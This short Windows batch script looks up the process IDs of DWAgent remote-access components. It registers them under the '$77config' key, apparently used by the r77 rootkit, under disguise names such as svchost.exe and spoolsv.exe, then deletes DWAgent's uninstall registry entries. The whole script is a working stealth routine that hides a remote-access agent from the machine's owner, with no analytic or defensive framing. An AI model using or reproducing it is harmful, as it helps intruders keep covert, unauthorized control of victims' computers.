
for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq dwagent.exe" ^| find "dwagent.exe"') do set PID1=%i
for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq dwagsvc.exe" ^| find "dwagsvc.exe"') do set PID2=%i
for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq dwaglnc.exe" ^| find "dwaglnc.exe"') do set PID3=%i
Reg.exe add "HKLM\SOFTWARE\$77config\process_names" /v "process%PID1%" /t REG_SZ /d "svchost.exe" /f
Reg.exe add "HKLM\SOFTWARE\$77config\process_names" /v "process%PID2%" /t REG_SZ /d "spoolsv.exe" /f
Reg.exe add "HKLM\SOFTWARE\$77config\process_names" /v "process%PID3%" /t REG_SZ /d "bridgecommunication.exe" /f
taskkill /F /IM dwagsvc.exe
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f
REG DELETE "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f

cd C:/
